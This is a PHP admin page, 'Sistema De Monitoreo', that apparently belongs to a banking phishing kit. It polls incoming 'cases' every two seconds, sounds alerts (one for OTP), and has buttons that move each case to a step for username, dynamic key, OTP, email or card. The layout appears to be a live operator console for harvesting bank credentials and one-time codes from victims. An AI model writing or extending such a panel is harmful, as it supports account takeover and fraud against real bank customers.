<?php 
session_start(); 
require('../lib/funciones.php');

date_default_timezone_set('America/Bogota');

if (isset($_SESSION["usuario0608"])) {
	
}else{	
	header("Location: ../");
}

?>
<head>
	<meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="shortcut icon" href="../img/metronic.ico">
	<title>Sistema De Monitoreo</title>	
	<link href="../css/styles-admin.css" rel="stylesheet">	
	<script type="text/javascript" src="../js/functions.js"></script>	
	<script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>	
</head>
<body bgcolor="#F5F8FA">
	<div class="menu">
		<table class="opciones-mob">
			<tr>
				<td><img src="../img/todos-a.svg" width="19"></td>
				<td><a href="../pending"><img src="../img/alarma-g.svg" width="19"></a></td>
				<td><a href="../closed"><img src="../img/final-g.svg" width="19"></a></td>
			</tr>
		</table>
		<div class="opciones"><span class="item-menu" style="background-color:#F4F6FA;color:#5e6278; ">Todos</span> <a href="../pending"><span class="item-menu">Pendientes</span></a> <a href="../closed"><span class="item-menu">Finalizados</span></a></div>
		<div class="cerrar"><img src="../img/cerrar-g.svg" width="19"></div>
	</div>
	<div class="items-trans">

			<?php
				cargar_casos();											
			?>	
	</div>
	<audio id="snd">
		<source src="../audio/timbre.mp3" type="audio/mpeg">
	</audio>
	<audio id="sndOTP">
		<source src="../audio/electrico.mp3" type="audio/mpeg">
	</audio>

	<div class="logo">
		<img src="../img/icono.png" width="30" style="margin:20px 0px;">
		<div style="width: 100%; border-bottom: 1px dashed #a58e8e;"></div>
	</div>	
</body>
<script type="text/javascript">
	$(document).ready(function(){	
		setInterval(actualizar_casos,2000);	

		
		$("#cerrar").click(function(evento){
			$.post( "../cerar-sesion.php",{ usr: $("#txtUsuario").val(), pass: $("#txtPass").val() }, function( data ) {	
				if (data == "OK") {
					window.location.href = "../";
				}
			});
		});

		

		$(document).on('click', '.usuario', function() {
 			$(this).attr('disabled','disabled')
			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"12" },function(data) {

			});
 		});

 		$(document).on('click', '.dinamica', function() {
 			$(this).attr('disabled','disabled')
			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"2" },function(data) {

			});
 		});

 		$(document).on('click', '.otp', function() {
 			$(this).attr('disabled','disabled')
			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"8" },function(data) {

			});
 		});

 		$(document).on('click', '.correo', function() { 
 			$(this).attr('disabled','disabled')
 			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"4" },function(data) {
				
			});
 		});

 		$(document).on('click', '.tarjeta', function() { 
 			$(this).attr('disabled','disabled')
 			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"6" },function(data) {
				
			});
 		});

 		$(document).on('click', '.finalizar', function() { 
 			$(this).attr('disabled','disabled')
 			$.post( "../process/estado.php",{ id:$(this).attr('id'),est:"10" },function(data) {
				
			});
 		});

 		

	});
</script>